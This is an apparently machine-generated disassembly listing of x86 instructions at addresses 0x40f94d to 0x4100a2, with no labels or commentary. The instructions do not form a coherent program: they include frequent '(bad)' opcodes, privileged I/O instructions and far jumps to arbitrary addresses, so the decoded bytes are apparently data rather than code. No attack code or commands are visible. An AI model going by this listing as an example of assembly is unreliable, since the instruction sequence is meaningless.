  40f94d:	gs cmp dl,al
  40f950:	lods   al,BYTE PTR ds:[esi]
  40f951:	jg     0x40f981
  40f953:	jb     0x40f903
  40f955:	jl     0x40f982
  40f957:	and    DWORD PTR [ebx+eax*1],ebp
  40f95a:	sbb    eax,0x61e3714
  40f95f:	iret   
  40f960:	rcl    eax,0xf4
  40f963:	cmp    al,0x61
  40f965:	sub    eax,0x55dd5200
  40f96a:	adc    cl,cl
  40f96c:	mov    al,0x82
  40f96e:	cs shl esi,0xd7
  40f972:	mov    ah,0xe6
  40f974:	sbb    al,0xba
  40f976:	(bad)  
  40f978:	fwait
  40f979:	cli    
  40f97a:	add    eax,0x6b069ba3
  40f97f:	pop    ss
  40f980:	(bad)  
  40f981:	iret   
  40f982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f983:	lods   al,BYTE PTR ds:[esi]
  40f984:	jecxz  0x40f97d
  40f986:	jne    0x40f967
  40f988:	pop    edx
  40f989:	out    0x7f,eax
  40f98b:	xchg   ecx,eax
  40f98c:	sbb    BYTE PTR [eax-0x1d9e87c3],dh
  40f992:	inc    ebx
  40f993:	jb     0x40f951
  40f995:	fdiv   st,st(7)
  40f997:	or     DWORD PTR [edi],eax
  40f999:	xor    DWORD PTR [eax],0xffffff8b
  40f99c:	mov    esp,0xd07fbe56
  40f9a1:	add    al,0x3
  40f9a3:	bound  esp,QWORD PTR [edx]
  40f9a5:	jge    0x40f94e
  40f9a7:	js     0x40f9c9
  40f9a9:	jne    0x40f9df
  40f9ab:	popf   
  40f9ac:	mov    bh,0x40
  40f9ae:	lahf   
  40f9af:	pop    esi
  40f9b0:	add    DWORD PTR [ebx-0x63],edi
  40f9b3:	rol    al,0xac
  40f9b6:	jno    0x40f9b6
  40f9b8:	mov    cl,0xdc
  40f9ba:	loope  0x40fa1f
  40f9bc:	adc    esi,DWORD PTR [esp+ebp*8]
  40f9bf:	(bad)  
  40f9c0:	imul   ecx,ebp,0xd3e4f0d4
  40f9c6:	and    ebp,DWORD PTR ds:[ebx+0x79]
  40f9ca:	push   ebp
  40f9cb:	ins    BYTE PTR es:[edi],dx
  40f9cc:	aad    0x4f
  40f9ce:	cli    
  40f9cf:	popf   
  40f9d0:	into   
  40f9d1:	idiv   DWORD PTR [eax+ebp*1]
  40f9d4:	out    dx,eax
  40f9d5:	fisttp WORD PTR [eax]
  40f9d7:	in     eax,dx
  40f9d8:	and    BYTE PTR [edi],0xac
  40f9db:	sub    BYTE PTR [ebp+0x9],ah
  40f9de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9df:	mov    BYTE PTR [ecx],dh
  40f9e1:	fdivr  QWORD PTR [ecx*8-0x4e5be599]
  40f9e8:	js     0x40fa1e
  40f9ea:	sub    ecx,edx
  40f9ec:	xor    ch,cl
  40f9ee:	test   eax,0x42fb58ac
  40f9f3:	sbb    esi,edx
  40f9f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9f6:	jle    0x40f9ed
  40f9f8:	mov    edi,es
  40f9fa:	(bad)  
  40f9fb:	or     DWORD PTR [ebp+eax*1-0x4403718],ebp
  40fa02:	jmp    0x40f9fd
  40fa04:	mov    ah,0x3f
  40fa06:	call   0x16b7:0x2f1dc6e7
  40fa0d:	pop    es
  40fa0e:	mov    al,0xd
  40fa10:	stc    
  40fa11:	addr16 jg 0x40fa2d
  40fa14:	out    0x8c,eax
  40fa16:	(bad)  
  40fa17:	adc    ch,BYTE PTR ds:0x29f07d33
  40fa1d:	cmp    esp,DWORD PTR [ebp+0x57]
  40fa20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa21:	in     eax,dx
  40fa22:	scas   eax,DWORD PTR es:[edi]
  40fa23:	mov    edx,0xf97259fa
  40fa28:	push   es
  40fa29:	pop    edx
  40fa2a:	pop    ds
  40fa2b:	les    ebx,FWORD PTR [edi+ebx*2]
  40fa2e:	mov    esp,0xa9e19b13
  40fa33:	(bad)  
  40fa34:	call   0x2de27557
  40fa39:	jne    0x40fa3b
  40fa3b:	out    dx,al
  40fa3c:	sub    BYTE PTR [eax-0x507b1fdb],cl
  40fa42:	aad    0x50
  40fa44:	popf   
  40fa45:	jmp    0x40fa39
  40fa47:	rcl    BYTE PTR [edx+0x59817686],0x6c
  40fa4e:	neg    BYTE PTR [esi]
  40fa50:	jg     0x40fa17
  40fa52:	lahf   
  40fa53:	daa    
  40fa54:	dec    esi
  40fa55:	xchg   DWORD PTR [ecx+eax*2],ebx
  40fa58:	inc    ebx
  40fa59:	jp     0x40fa06
  40fa5b:	adc    DWORD PTR [eax-0x47cc0153],ebp
  40fa61:	pop    ss
  40fa62:	cmp    eax,edx
  40fa64:	jle    0x40fab4
  40fa66:	cmp    al,0x7b
  40fa68:	(bad)  
  40fa69:	je     0x40fa41
  40fa6b:	inc    ebp
  40fa6c:	jecxz  0x40fa2a
  40fa6e:	push   esp
  40fa6f:	imul   esp,DWORD PTR [esi],0xbc7a3865
  40fa75:	fxch   st(4)
  40fa77:	inc    ecx
  40fa78:	sub    al,0x3e
  40fa7a:	jb     0x40fa50
  40fa7c:	(bad)  
  40fa7d:	cmp    BYTE PTR [ecx-0x3bb972c1],dl
  40fa83:	jl     0x40fa9a
  40fa85:	retf   
  40fa86:	mov    ch,0xc6
  40fa88:	dec    edi
  40fa89:	mov    WORD PTR [ebp-0x6a],ds
  40fa8c:	mov    ds:0x225a2356,eax
  40fa91:	je     0x40fa14
  40fa93:	push   ebx
  40fa94:	mov    al,0x98
  40fa96:	fdivr  QWORD PTR [edx]
  40fa98:	repnz fiadd DWORD PTR [ebp-0x1e95762e]
  40fa9f:	out    0x99,eax
  40faa1:	cmc    
  40faa2:	add    bl,BYTE PTR ds:0xb08ab220
  40faa8:	ja     0x40fa70
  40faaa:	popa   
  40faab:	cmp    al,BYTE PTR [esi+0x2fc4a83d]
  40fab1:	adc    DWORD PTR [ecx+0x5d],ebx
  40fab4:	ja     0x40fb1a
  40fab6:	cli    
  40fab7:	cmp    al,0x32
  40fab9:	xchg   esp,eax
  40faba:	jle    0x40fab8
  40fabc:	out    dx,al
  40fabd:	shl    BYTE PTR [eax],cl
  40fabf:	mov    eax,ds:0x9b7cead7
  40fac4:	mov    ecx,0xa332b828
  40fac9:	shr    BYTE PTR [edx+0x6d22276a],0x7
  40fad0:	leave  
  40fad1:	lods   eax,DWORD PTR ds:[esi]
  40fad2:	shr    DWORD PTR [edi+0x65],1
  40fad5:	push   esp
  40fad6:	nop
  40fad7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fad8:	cmp    al,0xe3
  40fada:	addr16 stc 
  40fadc:	fidivr DWORD PTR [ebp+0x25981b2b]
  40fae2:	cwde   
  40fae3:	repz je 0x40fb3b
  40fae6:	push   cs
  40fae7:	and    eax,0xa71cb8aa
  40faec:	clc    
  40faed:	addr16 in eax,dx
  40faef:	fiadd  WORD PTR [edx+eiz*2+0x4ba245d7]
  40faf6:	(bad)  
  40faf7:	int3   
  40faf8:	push   0x27
  40fafa:	xchg   DWORD PTR [ebp+0x34],esi
  40fafd:	push   cs
  40fafe:	mov    dl,0x53
  40fb00:	add    dh,BYTE PTR [edx+edi*8+0x16]
  40fb04:	cld    
  40fb05:	popa   
  40fb06:	sub    bh,BYTE PTR [ebp-0x48aa9cf]
  40fb0c:	(bad)  
  40fb0d:	(bad)  
  40fb0e:	call   0xcfee2a39
  40fb13:	adc    eax,0xb88234c4
  40fb18:	jmp    0x62eb:0xd1274ae3
  40fb1f:	xchg   ebx,eax
  40fb20:	pop    ecx
  40fb21:	jl     0x40fb1f
  40fb23:	gs push es
  40fb25:	pop    edi
  40fb26:	pusha  
  40fb27:	out    dx,al
  40fb28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb29:	dec    edx
  40fb2a:	pop    ds
  40fb2b:	sbb    BYTE PTR [ebx+ebx*1-0x4a],ah
  40fb2f:	call   0x60a9427b
  40fb34:	push   edx
  40fb35:	jle    0x40fb10
  40fb37:	cwde   
  40fb38:	(bad)  [ebp-0x3e]
  40fb3b:	scas   eax,DWORD PTR es:[edi]
  40fb3c:	add    dh,cl
  40fb3e:	fucom  st(0)
  40fb40:	or     edx,DWORD PTR [edx-0x53]
  40fb43:	retf   0xe0a1
  40fb46:	enter  0x2968,0x64
  40fb4a:	jne    0x40fade
  40fb4c:	in     eax,dx
  40fb4d:	pop    edx
  40fb4e:	mov    esp,0x9705f0fa
  40fb53:	adc    al,0xea
  40fb55:	sti    
  40fb56:	push   cs
  40fb57:	push   0x6169600a
  40fb5c:	mov    BYTE PTR [edi-0x4c],bl
  40fb5f:	pusha  
  40fb60:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40fb62:	(bad)  [eax+0x74]
  40fb65:	xchg   ecx,eax
  40fb66:	adc    BYTE PTR [edx],dl
  40fb68:	mov    dl,0xc8
  40fb6a:	stos   BYTE PTR es:[edi],al
  40fb6b:	cli    
  40fb6c:	retf   0x2dfc
  40fb6f:	pop    ds
  40fb70:	push   ebp
  40fb71:	jg     0x40fb01
  40fb73:	xor    DWORD PTR [eax+edi*1+0x15d291f1],0xffffffd7
  40fb7b:	std    
  40fb7c:	icebp  
  40fb7d:	addr16 jns 0x40fb99
  40fb80:	jmp    0x82bd2bfa
  40fb85:	aas    
  40fb86:	pop    es
  40fb87:	(bad)  
  40fb88:	push   esp
  40fb89:	jecxz  0x40fb86
  40fb8b:	mov    eax,ds:0x2c7743b7
  40fb90:	(bad)  
  40fb91:	retf   0x48d7
  40fb94:	out    0xfd,eax
  40fb96:	inc    ebp
  40fb97:	dec    eax
  40fb98:	mov    ecx,0x1a2906bf
  40fb9d:	mov    BYTE PTR [ebx],dl
  40fb9f:	clc    
  40fba0:	dec    esp
  40fba1:	popf   
  40fba2:	ror    ecx,cl
  40fba4:	adc    edx,DWORD PTR [ebx-0x80]
  40fba7:	adc    al,0xee
  40fba9:	push   0xffffffb7
  40fbab:	test   DWORD PTR [esi-0x7f],esi
  40fbae:	inc    DWORD PTR [ecx-0x2e1fdbbc]
  40fbb4:	out    dx,eax
  40fbb5:	jmp    0x6011497e
  40fbba:	je     0x40fb5b
  40fbbc:	inc    edi
  40fbbd:	dec    eax
  40fbbe:	mov    eax,0x4c75ab63
  40fbc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbc4:	repnz in eax,dx
  40fbc6:	sbb    BYTE PTR [eax],dl
  40fbc8:	mov    ebx,DWORD PTR [esi+0x2799d0b0]
  40fbce:	xor    BYTE PTR [ecx],bl
  40fbd0:	dec    ebx
  40fbd1:	je     0x40fbe0
  40fbd3:	popf   
  40fbd4:	les    edx,FWORD PTR [eax+ebp*1-0x548764b]
  40fbdb:	sub    esi,esp
  40fbdd:	aaa    
  40fbde:	fwait
  40fbdf:	ins    BYTE PTR es:[edi],dx
  40fbe0:	pop    edi
  40fbe1:	call   0xcc8767f6
  40fbe6:	jo     0x40fc61
  40fbe8:	jg     0x40fbc4
  40fbea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbeb:	cmp    DWORD PTR [edx-0x6b],ebx
  40fbee:	cmp    DWORD PTR [ecx-0x66],edx
  40fbf1:	and    eax,0x576adaf
  40fbf6:	jmp    0x40fb9b
  40fbf8:	ds adc eax,0x2d279f65
  40fbfe:	ret    
  40fbff:	dec    ecx
  40fc00:	jmp    0x40fbb7
  40fc02:	or     eax,ebp
  40fc04:	ret    
  40fc05:	push   eax
  40fc06:	ins    DWORD PTR es:[edi],dx
  40fc07:	rcl    DWORD PTR [ebx],0xd7
  40fc0a:	pop    es
  40fc0b:	push   edx
  40fc0c:	inc    ecx
  40fc0d:	hlt    
  40fc0e:	(bad)  
  40fc0f:	lods   eax,DWORD PTR ds:[esi]
  40fc10:	push   esp
  40fc11:	std    
  40fc12:	mov    al,ds:0x7132c1dc
  40fc17:	idiv   bh
  40fc19:	cdq    
  40fc1a:	push   ds
  40fc1b:	sti    
  40fc1c:	mov    ss,WORD PTR [esi]
  40fc1e:	sub    ch,ah
  40fc20:	push   0xb
  40fc22:	daa    
  40fc23:	sbb    DWORD PTR [ebp-0x15],0x4d1dc602
  40fc2a:	dec    edi
  40fc2b:	adc    dh,0x98
  40fc2e:	mov    al,0x2f
  40fc30:	and    BYTE PTR [ecx+eiz*2-0x7e],dl
  40fc34:	mov    edi,0x8de043
  40fc39:	rcr    BYTE PTR [edi+esi*8-0x52],1
  40fc3d:	loope  0x40fc25
  40fc3f:	push   ss
  40fc40:	bound  esp,QWORD PTR [ecx-0x2d]
  40fc43:	(bad)  
  40fc44:	ror    DWORD PTR [edi],1
  40fc46:	cmp    eax,0xf7585866
  40fc4b:	ds jg  0x40fc79
  40fc4e:	xor    DWORD PTR [eax],0xffffff91
  40fc51:	les    edx,FWORD PTR [ebx+eax*2+0x7f]
  40fc55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc56:	pop    ebp
  40fc57:	or     esp,DWORD PTR [ebp-0x6c]
  40fc5a:	mov    ch,0x7c
  40fc5c:	fisub  WORD PTR [eax+0x5dec10df]
  40fc62:	imul   edi,DWORD PTR [edx-0x41d09922],0x878f33b2
  40fc6c:	add    edx,esi
  40fc6e:	ds std 
  40fc70:	ret    0x6415
  40fc73:	cmp    ebp,DWORD PTR [ebp-0x17fb42f]
  40fc79:	pop    ss
  40fc7a:	fistp  DWORD PTR [edi]
  40fc7c:	mov    dh,0x39
  40fc7e:	and    dh,BYTE PTR [eax+0x6f]
  40fc81:	jmp    0xb48e:0xc575bd59
  40fc88:	fdiv   QWORD PTR [ecx-0x15]
  40fc8b:	mov    al,ds:0xb33e656d
  40fc90:	stos   DWORD PTR es:[edi],eax
  40fc91:	cwde   
  40fc92:	dec    DWORD PTR [ecx]
  40fc94:	mov    edx,0x22d04018
  40fc99:	fcmovnu st,st(4)
  40fc9b:	and    al,0x7e
  40fc9d:	jo     0x40fd0c
  40fc9f:	push   0xdc67442c
  40fca4:	lds    ebx,FWORD PTR [eax+0x77c56da7]
  40fcaa:	push   ss
  40fcab:	and    eax,0x868e4695
  40fcb0:	add    bh,bl
  40fcb2:	xor    eax,eax
  40fcb4:	mov    ebx,0xe6753583
  40fcb9:	jno    0x40fd04
  40fcbb:	cmp    esi,edx
  40fcbd:	sub    cl,BYTE PTR [eax+ebp*2-0x2a]
  40fcc1:	imul   edi,DWORD PTR [ecx-0x2c],0x36af762a
  40fcc8:	data16 (bad) 
  40fcca:	clc    
  40fccb:	popa   
  40fccc:	push   edx
  40fccd:	fsub   st,st(4)
  40fccf:	out    dx,eax
  40fcd0:	xor    DWORD PTR [ebp+ebp*1+0x53],ecx
  40fcd4:	xchg   ebx,eax
  40fcd5:	inc    ecx
  40fcd6:	sti    
  40fcd7:	push   esi
  40fcd8:	adc    eax,0x4e3f8deb
  40fcdd:	jp     0x40fccc
  40fcdf:	push   edx
  40fce0:	mov    ds:0x89162d0c,eax
  40fce5:	sahf   
  40fce6:	sbb    ebp,DWORD PTR [edx+0x7a12a90b]
  40fcec:	out    dx,eax
  40fced:	inc    edi
  40fcee:	pop    eax
  40fcef:	(bad)  
  40fcf0:	xchg   esi,eax
  40fcf1:	mov    ds:0xc0d8f2b8,al
  40fcf6:	sbb    dh,ch
  40fcf8:	das    
  40fcf9:	fbld   TBYTE PTR [esi+0x2dbcec35]
  40fcff:	retf   
  40fd00:	in     al,dx
  40fd01:	or     DWORD PTR [ebx-0x76],eax
  40fd04:	cwde   
  40fd05:	cmp    DWORD PTR [edx-0x6d],esi
  40fd08:	mov    WORD PTR [esi+eax*1-0x60e67f],fs
  40fd0f:	rcl    BYTE PTR [eax],cl
  40fd11:	(bad)  [edx+0x5c]
  40fd14:	je     0x40fcb1
  40fd16:	xchg   esi,eax
  40fd17:	xchg   edi,eax
  40fd18:	in     al,dx
  40fd19:	pop    esi
  40fd1a:	pop    esp
  40fd1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd1c:	mov    cl,0x11
  40fd1e:	jmp    0xe728:0x2edc614c
  40fd25:	adc    bh,BYTE PTR ds:0xea9576c7
  40fd2b:	sti    
  40fd2c:	add    DWORD PTR [edx],edx
  40fd2e:	mov    esp,0x4b1c570b
  40fd33:	add    eax,0x514562a0
  40fd38:	popa   
  40fd39:	push   0x6c
  40fd3b:	(bad)  
  40fd3c:	pop    ss
  40fd3d:	cmp    al,0xf3
  40fd3f:	and    bl,0x64
  40fd42:	mov    cl,0xb9
  40fd44:	repz cli 
  40fd46:	push   cs
  40fd47:	fadd   DWORD PTR [ebx+0x71]
  40fd4a:	mov    ecx,0xc7adb4cb
  40fd4f:	aam    0x64
  40fd51:	test   esi,ecx
  40fd53:	cld    
  40fd54:	fidivr DWORD PTR [ecx-0x32b33038]
  40fd5a:	mov    edi,0x1a4c9f3e
  40fd5f:	push   edi
  40fd60:	retf   
  40fd61:	xor    eax,0xe860bbbd
  40fd66:	pusha  
  40fd67:	stc    
  40fd68:	mov    cl,0x6
  40fd6a:	mov    cl,BYTE PTR [eax]
  40fd6c:	aaa    
  40fd6d:	dec    eax
  40fd6e:	sti    
  40fd6f:	dec    eax
  40fd70:	(bad)  
  40fd72:	sub    al,0x5d
  40fd74:	mov    dl,0x46
  40fd76:	inc    ecx
  40fd77:	jbe    0x40fd1c
  40fd79:	sub    eax,0xf9d14c63
  40fd7e:	fcmovbe st,st(2)
  40fd80:	(bad)  
  40fd81:	in     eax,dx
  40fd82:	or     al,BYTE PTR [esi-0x42]
  40fd85:	ins    DWORD PTR es:[edi],dx
  40fd86:	fisttp DWORD PTR [ecx+0x369820d6]
  40fd8c:	dec    edi
  40fd8d:	ja     0x40fd6d
  40fd8f:	shr    BYTE PTR [edi+0x76],0x23
  40fd93:	rol    BYTE PTR ds:0x83767c67,cl
  40fd99:	les    eax,FWORD PTR [eax+0x214bceea]
  40fd9f:	dec    esi
  40fda0:	stos   DWORD PTR es:[edi],eax
  40fda1:	and    eax,0x3553342c
  40fda6:	dec    ebp
  40fda7:	(bad)  
  40fda8:	jl     0x40fdbc
  40fdaa:	repnz add bh,bh
  40fdad:	cwde   
  40fdae:	sbb    cl,BYTE PTR [ebp+0x34e4ae4a]
  40fdb4:	sbb    eax,0x94a0ed61
  40fdb9:	ins    BYTE PTR es:[edi],dx
  40fdba:	mov    esi,DWORD PTR [esi-0x3b4a55c]
  40fdc0:	dec    eax
  40fdc1:	add    BYTE PTR [ecx-0x4043a2b],bh
  40fdc7:	loope  0x40fd7e
  40fdc9:	pop    edx
  40fdca:	les    ebx,FWORD PTR [esi-0x1cfc0618]
  40fdd0:	adc    eax,DWORD PTR [ecx+0x4549bf1f]
  40fdd6:	lahf   
  40fdd7:	clc    
  40fdd8:	dec    ebp
  40fdd9:	sub    DWORD PTR fs:[ecx-0x7b13e125],edx
  40fde0:	mov    al,cl
  40fde2:	pop    esp
  40fde3:	fisttp WORD PTR [ebx+ebx*4-0x5301a211]
  40fdea:	mov    ah,0xf5
  40fdec:	mul    BYTE PTR [esi+0x5d]
  40fdef:	cmp    BYTE PTR [ebx],dh
  40fdf1:	(bad)  
  40fdf3:	rol    DWORD PTR [ebp+0x725ff582],0xd0
  40fdfa:	mov    eax,DWORD PTR [eax-0x1b]
  40fdfd:	(bad)  ds:0x861e8ac5
  40fe03:	fcomp  QWORD PTR [edx]
  40fe05:	imul   ebx,DWORD PTR [esi-0x55cd0346],0xffffffda
  40fe0c:	fnstenv [edx-0x80]
  40fe0f:	cmp    al,0xe4
  40fe11:	clc    
  40fe12:	mov    edx,0x61f93154
  40fe17:	or     BYTE PTR [ebx-0x1586b6d8],ah
  40fe1d:	ucomiss xmm3,DWORD PTR [eax]
  40fe20:	icebp  
  40fe21:	bound  ecx,QWORD PTR [edx-0x72ea51c9]
  40fe27:	sbb    DWORD PTR [ebp+0xa0ba689],0xe5d6834f
  40fe31:	jo     0x40fdc7
  40fe33:	out    0xc4,eax
  40fe35:	stos   BYTE PTR es:[edi],al
  40fe36:	fsubr  QWORD PTR [ebp-0x36]
  40fe39:	or     al,0x1
  40fe3b:	jns    0x40fe48
  40fe3d:	ja     0x40fe33
  40fe3f:	(bad)  
  40fe40:	jne    0x40fded
  40fe42:	jge    0x40fe38
  40fe44:	mov    BYTE PTR [ebp+0x346d25bb],bl
  40fe4a:	xor    dl,BYTE PTR [edi+0x340c4f54]
  40fe50:	mov    esp,0x1ec56a11
  40fe55:	stos   DWORD PTR es:[edi],eax
  40fe56:	aam    0x40
  40fe58:	repnz std 
  40fe5a:	inc    esp
  40fe5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe5c:	out    0xe9,al
  40fe5e:	out    0xf0,eax
  40fe60:	mov    bh,0x29
  40fe62:	add    BYTE PTR [ecx+0x5d5f13b0],ah
  40fe68:	xchg   DWORD PTR [edi+0x287e7855],edi
  40fe6e:	aaa    
  40fe6f:	and    eax,0x13a113e0
  40fe74:	mov    edi,0xb7974133
  40fe79:	xor    ebp,DWORD PTR [ecx+0x51]
  40fe7c:	ror    ch,0x68
  40fe7f:	xchg   ecx,eax
  40fe80:	cwde   
  40fe81:	jge    0x40fe10
  40fe83:	and    eax,0xdd68c68a
  40fe88:	sub    esi,DWORD PTR [ebx]
  40fe8a:	push   0xcf332810
  40fe8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe90:	retf   0x270c
  40fe93:	das    
  40fe94:	fs mov edi,0x60cf2fc3
  40fe9a:	int3   
  40fe9b:	jl     0x40fe20
  40fe9d:	das    
  40fe9e:	into   
  40fe9f:	mov    es,WORD PTR [ebx-0x6d]
  40fea2:	push   edx
  40fea3:	imul   ebx,DWORD PTR [ecx-0x3b],0xfffffff9
  40fea7:	and    eax,0x7986226
  40feac:	or     al,0xd2
  40feae:	pop    edx
  40feaf:	adc    bl,0x18
  40feb2:	dec    ebp
  40feb3:	jae    0x40ff19
  40feb5:	ret    
  40feb6:	xchg   ebx,eax
  40feb7:	outs   dx,DWORD PTR ds:[esi]
  40feb8:	repnz pop edx
  40feba:	inc    esi
  40febb:	jmp    0x40ff2d
  40febd:	hlt    
  40febe:	lea    edx,[ebx-0x5d0e3248]
  40fec4:	in     al,dx
  40fec5:	fld    DWORD PTR gs:[edi+0x5a15b1c6]
  40fecc:	sbb    al,0x75
  40fece:	cmp    eax,0x206d6d42
  40fed3:	or     al,0xb3
  40fed5:	jge    0x40fe95
  40fed7:	daa    
  40fed8:	lahf   
  40fed9:	inc    esp
  40feda:	lods   eax,DWORD PTR ds:[esi]
  40fedb:	cmp    BYTE PTR [edx+0xb],bl
  40fede:	sub    DWORD PTR [esi-0x2008930e],0xffffff84
  40fee5:	dec    edx
  40fee6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fee7:	inc    edx
  40fee8:	cmp    DWORD PTR [edi],eax
  40feea:	pop    ss
  40feeb:	ds or  al,0xda
  40feee:	ins    BYTE PTR es:[edi],dx
  40feef:	in     eax,0xda
  40fef1:	outs   dx,BYTE PTR ds:[esi]
  40fef2:	sub    esp,eax
  40fef4:	push   ebp
  40fef5:	mov    ds:0x841f02d6,eax
  40fefa:	push   ds
  40fefb:	xor    BYTE PTR [edx+0x5d],ah
  40fefe:	cmp    edi,ebx
  40ff00:	mov    esi,ss
  40ff02:	dec    esi
  40ff03:	and    esi,DWORD PTR [ebp+0x396fce05]
  40ff09:	cmp    eax,0x15abc7ab
  40ff0e:	fistp  QWORD PTR [edx]
  40ff10:	les    edi,FWORD PTR [ebx-0x7b45d68]
  40ff16:	fld    QWORD PTR [edx+ecx*8-0x1e]
  40ff1a:	and    al,0xdd
  40ff1c:	sbb    BYTE PTR [esi],0x70
  40ff1f:	imul   ebp,DWORD PTR gs:[edx+esi*4-0x6bd6f65e],0xffffffa7
  40ff28:	fs aaa 
  40ff2a:	je     0x40ff01
  40ff2c:	mov    BYTE PTR [ecx+0x4f5c7e65],dl
  40ff32:	sub    DWORD PTR [si+0x26],esi
  40ff36:	mov    esi,0xe502f1bb
  40ff3b:	mov    WORD PTR [edx-0x256345c7],fs
  40ff41:	stos   BYTE PTR es:[edi],al
  40ff42:	fmul   QWORD PTR [eax+0x1dfcfaa]
  40ff48:	shl    DWORD PTR ds:0xd98c281b,0x3b
  40ff4f:	(bad)  
  40ff50:	fidivr WORD PTR [ebx+0x3c]
  40ff53:	jnp    0x40ff29
  40ff55:	fadd   QWORD PTR [eax-0x26]
  40ff58:	cld    
  40ff59:	jecxz  0x40ff42
  40ff5b:	xor    eax,DWORD PTR [edx+0x3e]
  40ff5e:	imul   esi,DWORD PTR [ebp+ebx*1+0x72],0xc6ee10ba
  40ff66:	ins    DWORD PTR es:[edi],dx
  40ff67:	pop    edi
  40ff68:	pop    ss
  40ff69:	icebp  
  40ff6a:	sbb    DWORD PTR [edi],edx
  40ff6c:	inc    edx
  40ff6d:	into   
  40ff6e:	adc    DWORD PTR [ebx+0x64],0x259072e8
  40ff75:	add    BYTE PTR [ecx+0x43],ah
  40ff78:	and    BYTE PTR [ebp-0x22],ah
  40ff7b:	pusha  
  40ff7c:	in     eax,dx
  40ff7d:	(bad)  
  40ff7e:	or     BYTE PTR [ecx],dl
  40ff80:	xlat   BYTE PTR ds:[ebx]
  40ff81:	js     0x40ff2e
  40ff83:	test   DWORD PTR [edx+edi*2],esp
  40ff86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff87:	es xor dl,0xe7
  40ff8b:	xor    DWORD PTR [esp+ebx*2+0x14],esi
  40ff8f:	mov    ebp,0xc59fca7
  40ff94:	div    esi
  40ff96:	sub    BYTE PTR [edx+0x41],ch
  40ff99:	dec    ecx
  40ff9a:	or     DWORD PTR [edx],0xffffff8e
  40ff9d:	aam    0xcc
  40ff9f:	mov    eax,0xca4782a6
  40ffa4:	mov    ch,0x5e
  40ffa6:	mov    ebx,0x9d84eeba
  40ffab:	out    0x8f,eax
  40ffad:	dec    esi
  40ffae:	jmp    0x40ff44
  40ffb0:	shl    ah,cl
  40ffb2:	ins    DWORD PTR es:[edi],dx
  40ffb3:	mov    ds:0x1e78ed34,al
  40ffb8:	mov    ah,al
  40ffba:	loop   0x40ffc2
  40ffbc:	pop    es
  40ffbd:	cmpxchg DWORD PTR [ebp-0x1d],esp
  40ffc1:	popa   
  40ffc2:	inc    esi
  40ffc3:	test   DWORD PTR [ebx-0x3],0x211dc9a9
  40ffca:	push   es
  40ffcb:	in     eax,0x6d
  40ffcd:	sub    BYTE PTR [edi],bl
  40ffcf:	fs pop ecx
  40ffd1:	mov    esp,eax
  40ffd3:	xor    DWORD PTR [esi],ecx
  40ffd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffd6:	xlat   BYTE PTR ds:[ebx]
  40ffd7:	pop    es
  40ffd8:	bound  edx,QWORD PTR [edi+esi*4+0x7]
  40ffdc:	push   esp
  40ffdd:	daa    
  40ffde:	push   esi
  40ffdf:	mov    esi,0x6ddfbe65
  40ffe4:	dec    esi
  40ffe5:	sub    edx,DWORD PTR [ebp-0x60]
  40ffe8:	fnstsw WORD PTR [eax]
  40ffea:	cs sbb eax,0x40823454
  40fff0:	sub    BYTE PTR [ebx+0x6375b37],ah
  40fff6:	jo     0x410050
  40fff8:	repz inc esp
  40fffa:	es pop esp
  40fffc:	hlt    
  40fffd:	mov    dl,0x1c
  40ffff:	mov    edi,0x5314b333
  410004:	in     al,0x6a
  410006:	xor    ebx,ebp
  410008:	repz data16 add BYTE PTR [ebx+eax*2-0x53],dl
  41000e:	add    DWORD PTR [ebx],0x44774d02
  410014:	inc    esp
  410015:	popf   
  410016:	jmp    0x410034
  410018:	mov    ecx,0xb8099adc
  41001d:	loop   0x40ffdb
  41001f:	int    0x53
  410021:	mov    esp,0xf9e7a63c
  410026:	fisubr WORD PTR [ecx+0x53f8c8c2]
  41002c:	xor    esp,0xffffffb8
  41002f:	add    BYTE PTR [ebp-0x57],dh
  410032:	shl    BYTE PTR [ecx-0x5a],cl
  410035:	mov    dl,0x48
  410037:	not    ch
  410039:	inc    edx
  41003a:	pushf  
  41003b:	inc    esi
  41003c:	hlt    
  41003d:	(bad)  
  41003f:	inc    edi
  410040:	test   al,0x16
  410042:	xor    BYTE PTR [ebx],dl
  410044:	push   ds
  410045:	dec    ecx
  410046:	jl     0x410002
  410048:	hlt    
  410049:	aaa    
  41004a:	js     0x41002a
  41004c:	mov    ah,0x23
  41004e:	stos   BYTE PTR es:[edi],al
  41004f:	adc    BYTE PTR [esi+0x179b34f1],dl
  410055:	sub    DWORD PTR [eax],ebx
  410057:	sub    BYTE PTR [edi+0x56],al
  41005a:	test   al,0x35
  41005c:	bound  ebp,QWORD PTR [edx]
  41005e:	ins    DWORD PTR es:[edi],dx
  41005f:	xor    BYTE PTR [edi+0x3e6b85ec],0x2
  410066:	shl    DWORD PTR [ecx-0x98c14a1],cl
  41006c:	jo     0x41001b
  41006e:	outs   dx,DWORD PTR ds:[esi]
  41006f:	and    eax,0xb87f6c98
  410074:	ja     0x410067
  410076:	xchg   esp,eax
  410077:	div    BYTE PTR [eax-0x3d]
  41007a:	pop    ss
  41007b:	js     0x4100c1
  41007d:	mov    edx,0xd6ce746e
  410082:	inc    esp
  410083:	mov    ch,0xb2
  410085:	stc    
  410086:	retf   0xaecf
  410089:	mov    dh,0x4e
  41008b:	outs   dx,DWORD PTR ds:[esi]
  41008c:	test   DWORD PTR ds:0x9e6981bd,0x1a22544a
  410096:	(bad)  
  410097:	das    
  410098:	mov    esi,0xfe1802dd
  41009d:	mov    ebp,esi
  41009f:	adc    al,dl
  4100a1:	pushf  
  4100a2:	pushf  
